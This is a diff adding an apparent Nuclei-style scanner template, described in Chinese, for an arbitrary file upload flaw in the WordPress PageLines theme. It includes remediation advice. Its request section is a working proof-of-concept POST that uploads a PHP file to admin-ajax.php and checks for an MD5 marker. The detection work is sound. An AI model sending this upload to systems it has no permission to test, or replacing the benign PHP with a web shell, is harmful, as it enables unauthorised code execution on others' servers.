@@ -1,0 +1,47 @@
+id: Wordpress-Pagelines_Plugins-ArbitraryFileUpload
+info:
+  name: WordPress Pagelines Arbitrary File Upload
+  author:
+  - l0ne1y
+  description: |-
+    WordPress Theme Pagelines 任意文件上传漏洞
+    WordPress是WordPress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。PageLines theme是使用在其中的一个多用途网站主题插件。
+
+    WordPress PageLines 后台未校验文件后缀名，导致攻击者可上传任意文件。
+  reference:
+  - http://www.freebuf.com/vuls/57594.html
+  severity: critical
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：https://www.pagelines.com/
+
+    临时修复方案：
+    文件上传：
+    1、服务器端将文件上传目录直接设置为不可执行。
+    2、文件类型检查：建议使用白名单方式（比黑名单更可靠），并结合MIME Type、后缀检查等方式（文件类型做白名单限制）。此外对于图片的处理可以使用压缩函数或resize函数，处理图片的同时破坏其包含的HTML代码。
+    3、使用随机数改写文件名和文件路径，使得用户不能轻易访问自己上传的文件。
+    4、单独设置文件服务器的域名。
+    5、验证文件内容，使用正则匹配恶意代码（过滤恶意代码各种绕过方式，如大小写、BASE64编码）限制上传。
+    6、修复服务器可能存在的解析漏洞。
+    7、严格限制可以修改服务器配置的文件上传如：.htaccess。
+    8、隐藏上传文件路径。
+    9、升级Web Server。
+    10、及时修复Web上传代码。
+    11、不能有本地文件包含漏洞。
+    12、注意0x00截断攻击（PHP更新到最新版本）。
+requests:
+- matchers:
+  - type: dsl
+    dsl:
+    - 'contains(body,"c4ca4238a0b923820dcc509a6f75849b") && status_code==200 '
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/wp-admin/admin-ajax.php?action=test&page=pagelines'
+  method: POST
+  body: |-
+    ------WebKitFormBoundary1Ja5UxAmMrAAwPGM Content-Disposition: form-data; name="settings_upload"
+    settings ------WebKitFormBoundary1Ja5UxAmMrAAwPGM Content-Disposition: form-data; name="file"; filename="Settingssettings.txt" Content-Type: text/plain
+    <?php echo md5(1); die(); ?> ------WebKitFormBoundary1Ja5UxAmMrAAwPGM Content-Disposition: form-data; name="submit"
+    Submit ------WebKitFormBoundary1Ja5UxAmMrAAwPGM--
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1Ja5UxAmMrAAwPGM
